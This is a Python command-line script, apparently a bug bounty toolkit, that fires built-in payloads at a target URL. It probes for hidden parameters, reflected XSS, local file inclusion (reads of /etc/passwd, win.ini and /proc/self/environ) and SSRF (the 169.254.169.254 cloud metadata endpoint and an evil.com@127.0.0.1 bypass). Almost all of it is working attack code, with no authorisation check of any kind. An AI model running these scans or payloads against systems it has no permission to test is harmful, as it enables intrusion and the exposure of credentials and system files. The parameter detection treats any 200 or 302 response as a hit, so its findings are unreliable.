import requests
import argparse
import json
from pathlib import Path

def load_list_from_file(filepath, fallback_list=None):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        if fallback_list:
            return fallback_list
        return []

def get_payloads(payload_folder, name, fallback):
    return load_list_from_file(f"{payload_folder}/{name}.txt", fallback)

DEFAULT_ARJUN_WORDLIST = [
    "id", "user", "item", "q", "search", "token", "redirect", "url", "next", "page", "email", "file", "path",
    "document", "callback", "action", "ref", "data", "input", "code", "type", "username", "password"
]
DEFAULT_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<math><mtext></mtext><script>alert(1)</script>",
    "<img src=x onerror=confirm(1)>",
    "<video><source onerror=\"alert(1)\"></video>",
    "<a href='javas&#99;ript:alert(1)'>Click</a>",
    "<input onfocus=alert(1) autofocus>"
]
DEFAULT_LFI_PAYLOADS = [
    "/etc/passwd", "../../etc/passwd", "../../../../etc/passwd", "../../../etc/passwd",
    "../windows/win.ini", "..\\..\\windows\\win.ini",
    "/proc/self/environ", "../../boot.ini", "../../../../boot.ini"
]
DEFAULT_SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0:80/", "http://[::1]/", "http://evil.com@127.0.0.1"
]

def find_hidden_params(url, wordlist, method="GET", verbose=False):
    found = []
    for param in wordlist:
        params = {param: "test"}
        try:
            if method.upper() == "GET":
                response = requests.get(url, params=params, timeout=4)
            else:
                response = requests.post(url, data=params, timeout=4)
            if param in response.text or response.status_code in [200, 302]:
                found.append(param)
        except Exception as e:
            if verbose:
                print(f"Error with param {param}: {str(e)}")
    return found

def xss_scan(url, params, payloads, method="GET", verbose=False):
    vulnerable = []
    for param in params:
        for payload in payloads:
            test_params = {p: "test" for p in params}
            test_params[param] = payload
            try:
                if method.upper() == "GET":
                    response = requests.get(url, params=test_params, timeout=4)
                else:
                    response = requests.post(url, data=test_params, timeout=4)
                if payload in response.text:
                    vulnerable.append({
                        "parameter": param,
                        "payload": payload,
                        "status_code": response.status_code
                    })
                    if verbose:
                        print(f"[VULNERABLE] XSS in '{param}' with '{payload}' (Status: {response.status_code})")
            except Exception as e:
                if verbose:
                    print(f"Error testing {param} with payload {payload}: {str(e)}")
    return vulnerable

def lfi_ssrf_scan(url, param, payloads, indicators, test_type="lfi", verbose=False):
    found = []
    for payload in payloads:
        params = {param: payload}
        try:
            response = requests.get(url, params=params, timeout=5)
            for i in indicators:
                if i in response.text:
                    found.append({
                        "parameter": param,
                        "payload": payload,
                        "indicator": i,
                        "status_code": response.status_code
                    })
                    if verbose:
                        print(f"[VULNERABLE] {test_type.upper()} in '{param}' with '{payload}' (Indicator: {i})")
        except Exception as e:
            if verbose:
                print(f"Error testing {param} with payload {payload}: {str(e)}")
    return found

def main():
    parser = argparse.ArgumentParser(description="Advanced Bug Bounty Toolkit with Payload Folder Support")
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--find-params", action="store_true", help="Find hidden parameters (Arjun/X8 style)")
    parser.add_argument("--xss-scan", action="store_true", help="Scan for XSS vulnerabilities")
    parser.add_argument("--lfi-scan", action="store_true", help="Scan for LFI vulnerabilities")
    parser.add_argument("--ssrf-scan", action="store_true", help="Scan for SSRF vulnerabilities")
    parser.add_argument("--method", default="GET", help="HTTP method to use")
    parser.add_argument("--params", nargs="+", help="Parameters to use in scan (for XSS/LFI/SSRF)")
    parser.add_argument("--payload-folder", default="payloads", help="Payload folder path (default: payloads)")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    arjun_wordlist = get_payloads(args.payload_folder, "parameters", DEFAULT_ARJUN_WORDLIST)
    xss_payloads = get_payloads(args.payload_folder, "xss", DEFAULT_XSS_PAYLOADS)
    lfi_payloads = get_payloads(args.payload_folder, "lfi", DEFAULT_LFI_PAYLOADS)
    ssrf_payloads = get_payloads(args.payload_folder, "ssrf", DEFAULT_SSRF_PAYLOADS)

    lfi_indicators = ["root:x:", "[extensions]", "daemon:", "boot.ini", "environment"]
    ssrf_indicators = ["EC2Metadata", "localhost", "127.0.0.1", "meta-data"]

    if args.find_params:
        found = find_hidden_params(args.url, arjun_wordlist, method=args.method, verbose=args.verbose)
        print(f"Found parameters: {found}")

    if args.xss_scan and args.params:
        vuln = xss_scan(args.url, args.params, xss_payloads, method=args.method, verbose=args.verbose)
        if vuln:
            print("\n[!] XSS Vulnerabilities Found:")
            print(json.dumps(vuln, indent=2))
        else:
            print("\n[-] No XSS vulnerabilities found.")

    if args.lfi_scan and args.params:
        summary = []
        for param in args.params:
            found = lfi_ssrf_scan(args.url, param, lfi_payloads, lfi_indicators, test_type="lfi", verbose=args.verbose)
            summary += found
        if summary:
            print("\n[!] LFI Vulnerabilities Found:")
            print(json.dumps(summary, indent=2))
        else:
            print("\n[-] No LFI vulnerabilities found.")

    if args.ssrf_scan and args.params:
        summary = []
        for param in args.params:
            found = lfi_ssrf_scan(args.url, param, ssrf_payloads, ssrf_indicators, test_type="ssrf", verbose=args.verbose)
            summary += found
        if summary:
            print("\n[!] SSRF Vulnerabilities Found:")
            print(json.dumps(summary, indent=2))
        else:
            print("\n[-] No SSRF vulnerabilities found.")

if __name__ == "__main__":
    main()